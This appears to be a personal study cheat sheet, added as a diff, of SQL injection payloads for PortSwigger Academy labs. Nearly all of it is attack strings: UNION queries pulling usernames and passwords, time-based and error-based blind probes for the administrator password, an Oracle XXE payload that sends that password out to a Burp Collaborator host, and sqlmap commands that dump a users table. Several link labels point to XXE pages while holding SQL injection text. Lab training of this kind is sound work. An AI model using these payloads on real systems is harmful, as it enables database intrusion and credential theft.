@@ -1,0 +1,40 @@
+- [[Web Pen Testing/Burp Suite + Portswigger Academy/SQL Injection/04 How to exploit#The single quote character `'` and look for errors or other anomalies.|'--]]
+- ' AND released = 1
+- [[Web Pen Testing/Burp Suite + Portswigger Academy/XXE/04 How to exploit#Retrieving hidden data|'+OR+1=1–]]
+- [[Web Pen Testing/Burp Suite + Portswigger Academy/XXE/04 How to exploit#SQL injection in different contexts|&#x53;ELECT * FROM information_schema.tables]]
+- [[Web Pen Testing/Burp Suite + Portswigger Academy/XXE/04 How to exploit#Determining the number of columns required|' ORDER BY 2-- ]]
+- ' ORDER BY 3--
+- [[Web Pen Testing/Burp Suite + Portswigger Academy/XXE/04 How to exploit|' UNION SELECT NULL,NULL– or ' UNION SELECT NULL FROM DUAL– or ' UNION SELECT 'a',NULL,NULL,NULL–   ]] 
+- ' UNION SELECT username || '~' || password FROM users–    
+- '; IF (1=2) WAITFOR DELAY '0:0:10'--    
+- <storeId>1 UNION SELECT NULL</storeId>    
+- '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END–    
+- '||pg_sleep(10)--    
+- '||(SELECT '')||'    
+- ' AND '1'='1    
+- '+UNION+SELECT+'abc','def'+FROM+dual–    
+- '+UNION+SELECT+'abc','def'#    
+- '+UNION+SELECT+NULL,NULL,NULL–    
+- '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables–    
+- '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--    
+- <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>    
+- TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--    
+- '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users–    
+- '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users–    
+- ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--    
+- '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'    
+- '||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'    
+- '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'    
+- ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a    
+- ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a    
+- '+UNION+SELECT+NULL,username||'~'||password+FROM+users–    
+- '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--    
+
+## SQLMap:
+
+- sqlmap -v -u 'https://TARGET.NET/search?term=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "term" --batch --cookie="_lab=YESYESYESYES; session=YESYESYESYES" --random-agent --level=2 --risk=2
+- SQLMAP DBS to get databases: sqlmap -p 'sort-by' -batch --dbms postgresql --technique E --level 5 --dbs
+- Use SQLMAP dump tables identified from public database: -p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public --tables
+- ContinueUse SQLMAP E Technique to get the users content: -p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump
+- Sqlmap -u "https://" –cookie="" -dbs –level 5 –risk 3 
+- python sqlmap.py -r "C:\Users\naisa\Desktop\Learning\BurpMysteryLab" -D public -T users --dump –threads=10 -batch
